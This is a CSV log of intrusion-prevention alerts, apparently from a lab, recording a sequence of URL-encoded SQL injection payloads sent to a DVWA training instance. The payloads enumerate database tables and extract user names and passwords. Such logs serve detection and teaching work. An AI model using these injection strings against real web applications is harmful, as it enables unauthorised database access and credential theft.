attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
15621,634540,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49165,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2Cuser%28%29+%23&Submit=Submit
15621,634541,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49168,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2Cuse1r%28%29+%23&Submit=Submit
15621,634542,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49183,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2Cdatabase%28%29+%23&Submit=Submit
15621,634543,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49187,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=+3+%27+and+1%3D1+union+select+null%2Cdatabase%28%29+%23&Submit=Submit
15621,634544,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49190,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit
15621,634545,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49192,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.users%23&Submit=Submit
15621,634546,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49197,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27users%27+%23&Submit=Submit
15621,634547,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49202,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit
15621,634549,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49211,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit
15621,634550,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49219,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27ENGINES%27+%23&Submit=Submit
15621,634551,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49222,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27PARTITIONS%27+%23&Submit=Submit
15621,634552,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49224,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27users%27+%23&Submit=Submit
15621,634555,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49227,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit
15621,634556,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49230,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D1+union+select+null%2C+table_name+from+information_schema.columns+where+table_name%3D%27PARTITIONS%27+%23&Submit=Submit
15621,634558,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49232,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Cpassword%29+from+PARTITIONS%23&Submit=Submit
15621,634559,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49234,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Cpassword%29+from+events%23&Submit=Submit
15621,634560,1,high,HTTP.URI.SQL.Injection,HTTP,18.218.115.60,172.31.69.28,49237,80,ips,signature,/DVWA/vulnerabilities/sqli/?id=3+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit
